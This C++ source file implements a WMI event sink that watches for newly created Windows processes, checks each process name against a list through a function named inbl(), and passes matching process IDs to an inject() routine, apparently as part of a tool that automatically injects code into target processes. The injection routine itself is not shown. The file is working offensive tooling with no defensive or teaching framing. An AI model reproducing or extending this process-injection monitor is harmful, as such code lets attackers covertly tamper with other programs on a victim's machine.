#include "eventsink.h"
#include "Utils.h"


ULONG EventSink::AddRef()
{
    return InterlockedIncrement(&m_lRef);
}

ULONG EventSink::Release()
{
    LONG lRef = InterlockedDecrement(&m_lRef);
    if (lRef == 0)
        delete this;
    return lRef;
}

HRESULT EventSink::QueryInterface(REFIID riid, void** ppv)
{
    if (riid == IID_IUnknown || riid == IID_IWbemObjectSink)
    {
        *ppv = (IWbemObjectSink*)this;
        AddRef();
        return WBEM_S_NO_ERROR;
    }
    else return E_NOINTERFACE;
}

HRESULT EventSink::SetStatus(LONG lFlags, HRESULT hResult, BSTR strParam, IWbemClassObject __RPC_FAR* pObjParam)
{
    return WBEM_S_NO_ERROR;
}




// Includes handling of Event Occurence
HRESULT EventSink::Indicate(long lObjectCount, IWbemClassObject** pArray)
{
    HRESULT hr = S_OK;
    _variant_t vtProp;

    // Walk through all returned objects
    for (int i = 0; i < lObjectCount; i++)
    {
        IWbemClassObject* pObj = pArray[i];

        // First, get a pointer to the object properties
        hr = pObj->Get(_bstr_t(L"TargetInstance"), 0, &vtProp, 0, 0);
        if (!FAILED(hr))
        {

            IUnknown* pProc = vtProp;
            hr = pProc->QueryInterface(IID_IWbemClassObject, (void**)&pObj);
            if (SUCCEEDED(hr))
            {
                _variant_t pVal;

                // print process name
                hr = pObj->Get(L"Name", 0, &pVal, NULL, NULL);
                if (SUCCEEDED(hr))
                {
                    if ((pVal.vt == VT_NULL) || (pVal.vt == VT_EMPTY)) {
                        VariantClear(&pVal);
                        return WBEM_S_FALSE;
                    }
                    
                    if (inbl(pVal.bstrVal) == FALSE) {
                        return WBEM_S_FALSE;
                    }
                }
                
                
                hr = pObj->Get(L"Handle", 0, &pVal, NULL, NULL);
                if (SUCCEEDED(hr))
                {
                    if ((pVal.vt == VT_NULL) || (pVal.vt == VT_EMPTY)) {
                        return WBEM_S_FALSE;
                    }
                    DWORD pid = (DWORD)wcstol(pVal.bstrVal, NULL, 10);


                    if (inject(pid) == FALSE) {
                        printf("[-] Error injecting in %lu\n", pid);
                        return WBEM_S_NO_ERROR;
                    }
                    
                    
                }
                VariantClear(&pVal);
            }
        }
        VariantClear(&vtProp);
    }

    return WBEM_S_NO_ERROR;
}


